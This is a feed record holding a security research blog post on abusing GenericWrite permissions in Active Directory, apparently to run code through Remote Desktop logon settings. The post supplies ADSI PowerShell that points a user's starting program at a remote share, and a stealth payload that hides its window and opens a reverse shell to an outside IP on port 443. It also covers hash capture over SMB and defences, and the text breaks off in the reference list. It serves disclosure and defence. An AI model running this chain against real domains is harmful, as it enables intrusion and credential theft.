{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-21 02:21:17","updatedTime":"2020-09-21 02:21:17","title":"ACE to RCE","link":"https://sensepost.com/blog/2020/ace-to-rce/","description":"<p>tl;dr: In this writeup I am going to describe how to abuse a GenericWrite ACE misconfiguration in Active Directory to run arbitrary executables.</p>\n\n\n\n<p>During a recent assessment I found a new way to abuse Access Control Entries in a misconfigured Active Directory instance. Before jumping into the juicy bits, I&#x2019;d first like to explain what these misconfigurations are, how we find them and finally how to abuse them. If you have preexisting knowledge on this topic you can jump to the section titled  &#x2018;<span style=\"color:#ff7900\" class=\"has-inline-color\">A new way of abusing GenericWrite</span>&#x2018;.</p>\n\n\n\n<h2>ACE, ACL and DACL&#x2019;s</h2>\n\n\n\n<p>In Microsoft products such as the Windows Operating system or Active Directory, you can use an &#x2018;Access Control Model&#x2019; to secure objects and attributes. Think of these objects as files, folders, Active Directory objects, registry keys, printers, devices, ports, services, processes, and threads.</p>\n\n\n\n<p>When editing rights on these objects you create Access Control Entries (ACE). A list of these ACEs is called an Access Control List (ACL), which come in two types:</p>\n\n\n\n<ul><li>A Discretionary Access Control List (DACL), which identifies security principals who are allowed or denied access;</li><li>A System Access Control List (SACL), which controls how access is audited.</li></ul>\n\n\n\n<p>These configured ACEs are enforced for specified security principals. A security principal is any entity that can be authenticated by an operating system, such as:</p>\n\n\n\n<ul><li>A user account;</li><li>A computer account;</li><li>Security groups for these accounts.</li></ul>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"765\" height=\"518\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/ad_acl_example_edited.png\" alt=\"\" class=\"wp-image-42053\"><figcaption>A graphical representation of a User Object DACL.</figcaption></figure></div>\n\n\n\n<h2>Identifying and abusing misconfigurations</h2>\n\n\n\n<h3>Permission types</h3>\n\n\n\n<p>Within Active Directory there are a ton of permission types one could use to configure an ACE. The following permission types are interesting from an attackers perspective:</p>\n\n\n\n<ul><li>GenericAll, full rights to the object;</li><li>GenericWrite, update the object&#x2019;s unprotected attributes;</li><li>WriteOwner, change object owner;</li><li>WriteDACL, modify object&#x2019;s ACEs;</li><li>AllExtendedRights, ability to add a user to a group or reset password;</li><li>ForceChangePassword, ability to change user&#x2019;s password;</li><li>Self (Self-Membership), ability to add yourself to a group.</li></ul>\n\n\n\n<h4>GenericWrite</h4>\n\n\n\n<p>Even though GenericWrite might seem like one of the more harmless permissions, in the right scenario this can actually be very useful. GenericWrite enables someone to edit attributes that are &#x2018;unprotected&#x2019;. For example, if an account has GenericWrite permissions on another Active Directory user object it can change the &#x2018;mobile&#x2019;-attribute, potentially enabling a two-factor bypass if the two-factor system uses SMS/phone calls and queries Active Directory for mobile phone numbers. In contrast, you are not able to update something like Group memberships or the users password since these are considered &#x2018;protected&#x2019; attributes.</p>\n\n\n\n<p>Being able to edit a mobile phone as an attacker is nice and all but it won&#x2019;t directly lead to additional rights within the domain or the ability to run arbitrary code. Luckily for us, Microsoft in their infinite wisdom has left some useful attributes &#x2018;unprotected&#x2019;. Before going into which attributes these are, let&#x2019;s first have a look how we can identify these misconfigurations.</p>\n\n\n\n<h3>PowerView</h3>\n\n\n\n<p>One of the ways to identify misconfigurations is to make use of the <a rel=\"noreferrer noopener\" href=\"https://github.com/PowerShellMafia/PowerSploit/\" target=\"_blank\">PowerSploit Post-Exploitation Framework</a>. PowerSploit is a collection of Microsoft PowerShell modules that can be used by penetration testers to aid them during assessments. One of the included modules is <a rel=\"noreferrer noopener\" href=\"https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\" target=\"_blank\">PowerView</a>. It can be used to gain situational awareness in Windows domains. What makes PowerView (and other tools that do this) so great is that they just use legitimate features of Windows to gather information that is available to all authenticated users within Active Directory. This means it requires no additional domain or local administrator rights to use (most of) the functions.</p>\n\n\n\n<figure class=\"wp-block-image alignwide size-large\"><img loading=\"lazy\" width=\"1024\" height=\"406\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/powerview_acl-1-1024x406.png\" alt=\"\" class=\"wp-image-42063\"><figcaption>Here you see PowerView functions being used to identify a user named <code>admin</code> that has an ACE giving the members of the security group <code>LAB\\servicedesk</code> the <code>GenericWrite</code> rights on the object.</figcaption></figure>\n\n\n\n<p>PowerView also contains functions that are able to abuse these misconfigurations.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"716\" height=\"257\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/powerview_edit.png\" alt=\"\" class=\"wp-image-42057\"><figcaption>Here we use the <code>Get-ADObject</code> and <code>Set-ADObject</code> to update the &#x2018;mobile&#x2019;-attribute of the same user.</figcaption></figure></div>\n\n\n\n<p>Even though this is a very usable way to identify and abuse these misconfigurations, in larger environments it can be very time consuming to sift through all the data gathered by PowerView (especially compared to other solutions). This is why we usually use BloodHound for identification instead.</p>\n\n\n\n<h3>BloodHound</h3>\n\n\n\n<p>During assessments we usually use <a rel=\"noreferrer noopener\" href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\">BloodHound</a> to identify (often unintended) relationships within an Active Directory environment. Doing so allows us to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. To collect information about the environment we run the BloodHound ingestor, <a rel=\"noreferrer noopener\" href=\"https://github.com/BloodHoundAD/SharpHound3\" target=\"_blank\">SharpHound</a>. </p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"940\" height=\"324\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/bloodhound_sharphound.png\" alt=\"\" class=\"wp-image-42059\"><figcaption>SharpHound generates output that we can then feed into BloodHound.</figcaption></figure></div>\n\n\n\n<p>In the animated gif below you can see that after importing the data into BloodHound we can identify the same misconfiguration we found with PowerView, but this time with just a few simple clicks.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/bloodhound_relation.gif\" alt=\"\"><figcaption>Using BloodHound to find the shortest path to Domain Admins.</figcaption></figure></div>\n\n\n\n<h3>Remote Server Administration Tools (RSAT)</h3>\n\n\n\n<p>Another way to identify and abuse these misconfigurations is to just use the the same tools system administrators use to configure them. You could download RSAT from the Microsoft website and install them locally on an endpoint. RSAT are basically the same tools that are installed on servers when installing the equivalent role or feature.</p>\n\n\n\n<p>As seen in the following screenshots, RSAT comes with both PowerShell Modules and graphical tools.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"617\" height=\"101\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_powershell_get.png\" alt=\"\" class=\"wp-image-42064\"><figcaption>Active Directory PowerShell Module.</figcaption></figure></div>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"858\" height=\"659\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_gui_acl.png\" alt=\"\" class=\"wp-image-42065\"><figcaption>&#x2018;ADSI Edit&#x2019; and &#x2018;Active Directory Users and Computers&#x2019;.</figcaption></figure></div>\n\n\n\n<p>After getting RSAT running on an endpoint the only limiting factor is the context of the current Active Directory user. As demonstrated in the screenshot/gif below, if the user has GenericWrite on another object, you are able to use RSAT to edit attributes.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"616\" height=\"234\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_powershell_edit-1.png\" alt=\"\" class=\"wp-image-42066\"><figcaption>Editing the &#x2018;Mobile&#x2019;-attribute on the Admin user using the ActiveDirectory Module.</figcaption></figure></div>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"871\" height=\"603\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_gui_edit.gif\" alt=\"\" class=\"wp-image-42067\"><figcaption>Editing the &#x2018;Mobile&#x2019;-attribute on the Admin user using &#x2018;Active Directory Users and Computers&#x2019;.</figcaption></figure></div>\n\n\n\n<h2>A new way of abusing GenericWrite</h2>\n\n\n\n<p>Now that you know how to identify and abuse Active Directory ACE misconfigurations we can start where my research began.</p>\n\n\n\n<p>If you have some preexisting knowledge on this topic, you probably already know about the unprotected &#x2018;logon script&#x2019; attribute in the &#x2018;Profile&#x2019;-tab or the fact that you could create a dummy Service Principal Name to (temporarily) enable kerberoasting on a object, but I would like to show another setting that can be used as an attack vector. This setting ties into <a rel=\"noreferrer noopener\" href=\"https://support.microsoft.com/en-us/help/3200967/changes-to-remote-connection-manager-in-windows-server\" target=\"_blank\">the now legacy</a> Remote Connection Manager (RCM).</p>\n\n\n\n<h3>Remote Connection Manager</h3>\n\n\n\n<p>In Windows Server 2012 R2 and earlier versions, when a user logs on to a server with the Terminal Server (TS)/Remote Desktop Session Host (RDSH) role installed, the RCM process contacts the domain controller to query the configurations that are specific to Remote Desktop for the user object in Active Directory. These settings are then applied during the user&#x2019;s login process to customise their sessions. </p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"412\" height=\"538\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_remote-desktop-service-profile.png\" alt=\"\" class=\"wp-image-42068\"><figcaption>For example, you could use RCM to set the users &#x2018;Profile Path&#x2019; in the &#x2018;Remote Desktop Service Profile&#x2019;-tab, enabling a form of roaming profiles.</figcaption></figure></div>\n\n\n\n<p>In most modern Active Directory environments, Group Policies and Remote Desktop Server collections are used to configure these settings instead of the Active Directory settings. The settings in Active Directory can not be applied on an organizational unit or security group basis, thus adding configuration overhead by having to manage these settings on the account level. This is probably why Microsoft decided to deprecate RCM on Windows Server 2016 and all later releases. This also means even if these settings are set in Active Directory, modern servers with the RDSH role installed will not query the domain controller during the login process of the user, thus not applying these settings.</p>\n\n\n\n<p>The RCM can however be re-enabled on an Windows Server 2016 or later based RDSH by creating the following registry entries. These changes require no reboot or restart of services to become active. </p>\n\n\n\n<p>This of course implies that you have already compromised the target server for this attack, and a user you are targeting is expected to authenticate to it.</p>\n\n\n\n<figure class=\"wp-block-table alignwide is-style-regular\"><table><thead><tr><th class=\"has-text-align-left\" data-align=\"left\">Path</th><th>Key</th><th>Type</th><th>Value</th></tr></thead><tbody><tr><td class=\"has-text-align-left\" data-align=\"left\">HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\</td><td>fQueryUserConfigFromDC</td><td>DWORD</td><td>0x00000001</td></tr><tr><td class=\"has-text-align-left\" data-align=\"left\">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\</td><td>fQueryUserConfigFromDC</td><td>DWORD</td><td>0x00000001</td></tr></tbody></table><figcaption>Registry keys to enable RCM.</figcaption></figure>\n\n\n\n<h3>The &#x2018;Environment&#x2019;-tab</h3>\n\n\n\n<p>Now let&#x2019;s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called &#x2018;Environment&#x2019;.</p>\n\n\n\n<p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the &#x2018;Starting program&#x2019; field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"400\" height=\"492\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_environment-tab.png\" alt=\"\" class=\"wp-image-42069\"><figcaption>During the logon process file.exe at 161.35.88.182 will be downloaded and ran.</figcaption></figure></div>\n\n\n\n<p>The tricky part about the UI elements is that they <a rel=\"noreferrer noopener\" href=\"https://docs.microsoft.com/en-us/windows/win32/ad/user-object-user-interface-mapping?redirectedfrom=MSDN#environment-sessions-remote-control-and-terminal-services-profile-property-pages\" target=\"_blank\">do not correspond to individual attributes</a>. Instead, the settings are stored in &#x2018;private data&#x2019; within Active Directory. Editing these values would be hard if you are unable to use the graphical interface of Active Directory, luckily you can still update these values using PowerShell. To figure out what values we need to change we can take a look at the documentation of the <a rel=\"noreferrer noopener\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/tsuserex/nn-tsuserex-iadstsuserex\" target=\"_blank\">IADsTSUserEx</a> interface and make an educated guess which values should correspond with the UI elements.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"915\" height=\"366\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_microsoft_documentation.png\" alt=\"\" class=\"wp-image-42070\"><figcaption>Part of the IADsTSUserEx documentation.</figcaption></figure></div>\n\n\n\n<p>After playing around with ADSI, I figured that the following PowerShell code should do the trick.</p>\n\n\n\n<pre class=\"wp-block-preformatted\"><span class=\"has-inline-color has-accent-color\">$UserObject</span> <span class=\"has-inline-color has-secondary-color\">=</span> <span style=\"color:#9a22f0\" class=\"has-inline-color\">([ADSI](</span><span style=\"color:#21d548\" class=\"has-inline-color\">&#34;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld&#34;</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">))</span>\n<span class=\"has-inline-color has-accent-color\">$UserObject.TerminalServicesInitialProgram</span> <span class=\"has-inline-color has-secondary-color\">=</span> <span style=\"color:#21d548\" class=\"has-inline-color\">&#34;\\\\1.2.3.4\\share\\file.exe&#34;</span>\n<span class=\"has-inline-color has-accent-color\">$UserObject.TerminalServicesWorkDirectory</span> <span class=\"has-inline-color has-secondary-color\">=</span> <span style=\"color:#21d548\" class=\"has-inline-color\">&#34;C:\\&#34;</span>\n<span class=\"has-inline-color has-accent-color\">$UserObject.SetInfo</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">()</span>\n</pre>\n\n\n\n<p>As seen in the gif below, with the code above we are able to set and clear values on the user object.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"981\" height=\"508\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_edit_with_adsi.gif\" alt=\"\" class=\"wp-image-42071\"><figcaption>Setting and clearing values from the user object.</figcaption></figure></div>\n\n\n\n<h3>Creating a payload</h3>\n\n\n\n<p>Since the <code>TerminalServicesInitialProgram</code> value would normally be used to replace the users graphical environment, once you set this to your payload only that specific application is ran and no further graphical environment loads. Not great for stealth.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img loading=\"lazy\" width=\"676\" height=\"698\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_no_gui.png\" alt=\"\" class=\"wp-image-42097\"><figcaption>Payload running as the only application in the users session.</figcaption></figure></div>\n\n\n\n<p>So when you want to be somewhat stealthy and not directly alert anyone who logs in to their account, you need to build some extra logic into your payload. During my research I found that these 2 steps are enough:</p>\n\n\n\n<ul><li>The payload should hide its own process window. The quicker it does this the better.</li><li>The payload should spawn <code>explorer.exe</code>, to not further alert the user.</li></ul>\n\n\n\n<p>One of the ways to create a payload that does these things is to use PowerShell. The PowerShell code below includes .Net code to load methods from the <code>Kernel32.dll</code> and <code>User32.dll</code>, more specifically the <code>GetConsoleWindow()</code> and <code>ShowWindow()</code> methods. These methods can be used to easily get our current process window and hide it from the user.</p>\n\n\n\n<pre class=\"wp-block-preformatted\"><span class=\"has-inline-color has-secondary-color\"># Load .Net methods for hiding/showing the console in the background\n# https://docs.microsoft.com/en-us/windows/console/getconsolewindow\n# https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#34b6df\" class=\"has-inline-color\">Add-Type</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-Name Window -Namespace Console -MemberDefinition</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#21d548\" class=\"has-inline-color\">&apos;\n[DllImport(&#34;Kernel32.dll&#34;)]\npublic static extern IntPtr GetConsoleWindow();\n\n[DllImport(&#34;user32.dll&#34;)]\npublic static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n&apos;</span><span class=\"has-inline-color has-secondary-color\">\n# Get our current console window</span><span class=\"has-inline-color has-accent-color\">\n$consolePtr </span><span class=\"has-inline-color has-secondary-color\">=</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">[Console.Window]::GetConsoleWindow()</span><span class=\"has-inline-color has-accent-color\">\n</span><span class=\"has-inline-color has-secondary-color\"># Hide our current console window</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">[Console.Window]::ShowWindow(</span><span class=\"has-inline-color has-accent-color\">$consolePtr</span><span class=\"has-inline-color has-secondary-color\">,</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">0</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">)</span></pre>\n\n\n\n<p>We can then start <code>explorer.exe</code> to spawn the normal graphical environment.</p>\n\n\n\n<pre class=\"wp-block-preformatted\"><span class=\"has-inline-color has-secondary-color\"># Spawn the graphical environment the user would expect</span>\n<span style=\"color:#34b6df\" class=\"has-inline-color\">explorer.exe</span></pre>\n\n\n\n<p>Once the graphical environment is loaded, we could for example load an obfuscated version of <a rel=\"noreferrer noopener\" href=\"https://github.com/besimorhino/powercat\" target=\"_blank\">powercat</a> and call out to an external service on port 443 to start a reverse shell.</p>\n\n\n\n<pre class=\"wp-block-preformatted\"><span class=\"has-inline-color has-secondary-color\"># Load a netcat like PowerShell function</span>\n<span style=\"color:#9a22f0\" class=\"has-inline-color\">Function</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#34b6df\" class=\"has-inline-color\">powerkitty</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">{</span>\n    <span class=\"has-inline-color has-secondary-color\"># SNIPPED</span>\n<span style=\"color:#9a22f0\" class=\"has-inline-color\">}</span>\n<span class=\"has-inline-color has-secondary-color\"># Run our reverse shell</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#34b6df\" class=\"has-inline-color\">powerkitty</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-c</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">161.35.88.182</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-p</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">443</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-ep</span></pre>\n\n\n\n<p>After combining the code above and some additional clean up, this is what a full payload could look like.</p>\n\n\n\n<pre class=\"wp-block-preformatted\"><span style=\"color:#34b6df\" class=\"has-inline-color\">Add-Type </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-Name Window -Namespace Console -MemberDefinition</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#21d548\" class=\"has-inline-color\">&apos;\n[DllImport(&#34;Kernel32.dll&#34;)]\npublic static extern IntPtr GetConsoleWindow();\n\n[DllImport(&#34;user32.dll&#34;)]\npublic static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n&apos;</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">[Console.Window]::ShowWindow(</span><span class=\"has-inline-color has-accent-color\">$</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">([Console.Window]::GetConsoleWindow())</span><span class=\"has-inline-color has-secondary-color\">,</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">0</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">)</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#34b6df\" class=\"has-inline-color\">explorer.exe</span><span class=\"has-inline-color has-accent-color\">\n</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">Function</span><span class=\"has-inline-color has-accent-color\"> </span><span style=\"color:#34b6df\" class=\"has-inline-color\">powerkitty </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">{</span><span style=\"color:#34b6df\" class=\"has-inline-color\">\n    </span><span class=\"has-inline-color has-secondary-color\"># SNIPPED</span><span style=\"color:#34b6df\" class=\"has-inline-color\">\n</span><span style=\"color:#9a22f0\" class=\"has-inline-color\">}</span><span style=\"color:#34b6df\" class=\"has-inline-color\">\npowerkitty </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-c</span><span style=\"color:#34b6df\" class=\"has-inline-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">161.35.88.182</span><span style=\"color:#34b6df\" class=\"has-inline-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-p</span><span style=\"color:#34b6df\" class=\"has-inline-color\"> </span><span style=\"color:#df8134\" class=\"has-inline-color\">443</span><span style=\"color:#34b6df\" class=\"has-inline-color\"> </span><span style=\"color:#9a22f0\" class=\"has-inline-color\">-ep</span></pre>\n\n\n\n<p>This PowerShell code does all the things we need, but since RCM expects an executable file we need to compile this PowerShell code to PE format. For that we can use a PowerShell Module called <a href=\"https://github.com/MScholtes/PS2EXE\" rel=\"noreferrer noopener\" target=\"_blank\">PS2EXE</a>.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/research/ad-acl-to-rce/raw/master/img/payload_ps2exe.png\" target=\"_blank\" rel=\"noreferrer noopener\"><img loading=\"lazy\" width=\"667\" height=\"181\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/payload_ps2exe.png\" alt=\"PS2EXE\" class=\"wp-image-42072\"></a><figcaption>Using PS2EXE to compile our PowerShell code to PE format.</figcaption></figure></div>\n\n\n\n<p>Now that we have our payload we can set everything up. We can use <code>smbserver.py</code> by <a rel=\"noreferrer noopener\" href=\"https://github.com/SecureAuthCorp/impacket\" target=\"_blank\">impacket</a> to spin up a SMB server that will host our payload and use netcat to receive the callback made by our payload. When the target user connects to a RDSH with RDP the RCM process will download and execute our payload.</p>\n\n\n\n<figure class=\"wp-block-image alignwide size-large\"><img src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_rce.gif\" alt=\"\"></figure>\n\n\n\n<h3>Password hash collection</h3>\n\n\n\n<p>During my research I did not find any additional RCM settings that can be used to run arbitrary executables, however I did find settings that can be used to gather password hashes; the <code>Profile Path</code> and <code>Remote Desktop Home Folder</code> fields in the <code>Remote Desktop Service Profile</code>-tab. These settings can be used make the RCM process contact an attacker owned SMB share during the logon process.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/research/ad-acl-to-rce/raw/master/img/genericwrite_remote-desktop-service-profile-home-folder-drive.png\" target=\"_blank\" rel=\"noreferrer noopener\"><img loading=\"lazy\" width=\"412\" height=\"537\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_remote-desktop-service-profile-home-folder-drive-1.png\" alt=\"\" class=\"wp-image-42162\"></a><figcaption>Adding a extra network drive with the drive letter Z:\\.</figcaption></figure></div>\n\n\n\n<p>The <code>Profile path</code> is not that useful. The user will get a temporary profile unless the SMB share is set up with very specific rights share/NTFS rights. Even if this is setup properly the user might notice, depending on the configuration of Active Directory, that they are missing personal files or settings.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/research/ad-acl-to-rce/raw/master/img/genericwrite_temp_profile.png\" target=\"_blank\" rel=\"noreferrer noopener\"><img loading=\"lazy\" width=\"330\" height=\"147\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_temp_profile.png\" alt=\"Profile Error\" class=\"wp-image-42075\"></a><figcaption>Error displayed to the user.</figcaption></figure></div>\n\n\n\n<p>However the <code>Remote Desktop Home Folder Drive</code> is pretty handy. If Windows is unable to use the path queried from Active Directory by RCM it will fallback to the default value. When this happens nothing is shown to the user, but it does cause an event to be triggered, EventID 1060.</p>\n\n\n\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/research/ad-acl-to-rce/raw/master/img/genericwrite_home-drive-eventid.png\" target=\"_blank\" rel=\"noreferrer noopener\"><img loading=\"lazy\" width=\"641\" height=\"293\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_home-drive-eventid.png\" alt=\"home folder drive eventvwr\" class=\"wp-image-42076\"></a><figcaption>EventID logged when RCM fails to use the supplied path.</figcaption></figure></div>\n\n\n\n<h2>Defenses</h2>\n\n\n\n<p>I&#x2019;ll start with some general recommendations.</p>\n\n\n\n<ul><li>Block outbound SMB traffic to the internet.<br>This will prevent/hinder a ton of possible (remote) attack vectors.</li><li>Monitor/block SMB traffic to internal endpoints/IP&#x2019;s.<br>Besides blocking outbound SMB traffic I&#x2019;d also recommended to either block or monitor SMB traffic to internal endpoints/IP&#x2019;s, especially endpoints that normally should not host file shares.</li><li>Using File Server Resource Manager to block executable files on file shares.<br>With the SMB restrictions above if an attacker wants to host a file reachable by the internal clients he will be forced to use existing shares in the internal network. These shares, if Microsoft server based, can be configured to monitor or block specific file types with <a rel=\"noreferrer noopener\" href=\"https://docs.microsoft.com/en-us/windows-server/storage/fsrm/fsrm-overview\" target=\"_blank\">File Server Resource Manager</a>.</li><li>Audit ACL change logs.<br>This will help catch attackers who abuse GenericAll, WriteOwner and WriteDACL or sysadmins who make accidental mistakes. You can use this <a rel=\"noreferrer noopener\" href=\"https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access\" target=\"_blank\">Technet article</a> as guidance to enable auditing for ACL changes.</li><li>Regular automated or manual auditing of existing ACL&#x2019;s.<br>This will help catch existing misconfigurations or provide an opportunity to discover edge cases where ACL Auditing missed some changes. To help with this you can use the following tools:<ul><li><a rel=\"noreferrer noopener\" href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\">BloodHound</a> with <a rel=\"noreferrer noopener\" href=\"https://github.com/DefensiveOrigins/PlumHound\" target=\"_blank\">PlumHound</a></li><li><a rel=\"noreferrer noopener\" href=\"https://github.com/canix1/ADACLScanner\" target=\"_blank\">ADACLScanner</a></li><li><a rel=\"noreferrer noopener\" href=\"https://github.com/vletoux/pingcastle\" target=\"_blank\">PingCastle</a></li></ul></li></ul>\n\n\n\n<p>The next set of recommendations are more focused on the attack vectors described in this writeup.</p>\n\n\n\n<ul><li>If you are using Server 2016 or later and you don&#x2019;t use RCM in your environment ensure it is disabled by creating the <code>fQueryUserConfigFromDC</code> registry entry with a value of <code>0x00000000</code>. Make sure to also monitor changes to these registry keys. I was unable to find a way to disable RCM on servers that have it enabled by default.</li><li>Monitor what processes are started during the login process of a user and what they are doing. To be somewhat stealthy the payload needs to hide its own process window from the user and spawn a graphical environment. I don&#x2019;t think that there are many process that actually do this during the logon process.</li><li>Monitor for EventID 1060. This EventID is triggered by the RCM process when it is unable to use the specified path in <code>Remote Desktop Home Folder Drive</code>.</li></ul>\n\n\n\n<h2>Possible further research</h2>\n\n\n\n<ul><li>RCM can only be active on servers that have the Terminal Server/Remote Desktop Services Host role installed. It would be interesting to see if Windows can be tricked into enabling RCM on a server without the TS/RDSH role.</li><li>A way to disable RCM on older version of Windows Server.</li><li>Any additional ways to hide a payload and spawn the normal graphical environment.</li><li>Each user object also has a <code>Remote Control</code>-tab. This tab allows you to configure shadowing without user consent. Though in recent versions of Windows consent is required by default. </li></ul>\n\n\n\n<figure class=\"wp-block-gallery aligncenter columns-2 is-cropped\"><ul class=\"blocks-gallery-grid\"><li class=\"blocks-gallery-item\"><figure><img loading=\"lazy\" width=\"393\" height=\"279\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/shadow_no_consent.png\" alt=\"\" data-id=\"42077\" data-link=\"https://blog.sensepost.com/?attachment_id=42077\" class=\"wp-image-42077\"></figure></li><li class=\"blocks-gallery-item\"><figure><img loading=\"lazy\" width=\"739\" height=\"265\" src=\"https://sensepost.com/img/pages/blog/2020/ace-to-rce/shadow_local_admin_require_prompt.png\" alt=\"\" data-id=\"42078\" data-full-url=\"https://blog.sensepost.com/wp-content/uploads/2020/07/shadow_local_admin_require_prompt.png\" data-link=\"https://blog.sensepost.com/?attachment_id=42078\" class=\"wp-image-42078\"></figure></li></ul></figure>\n\n\n\n<h2>Previous research done on the topic of Active Directory DACL&#x2019;s</h2>\n\n\n\n<ul><li><a href=\"https://www.sstic.org/2014/presentation/chemins_de_controle_active_directory/\" rel=\"noreferrer noopener\" target=\"_blank\">Chemins de contr&#xF4;le en environnement Active Directory</a></li><li><a href=\"https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf\" rel=\"noreferrer noopener\" target=\"_blank\">An ACE Up the Sleeve Designing Active Directory DACL Backdoors (DEF CON 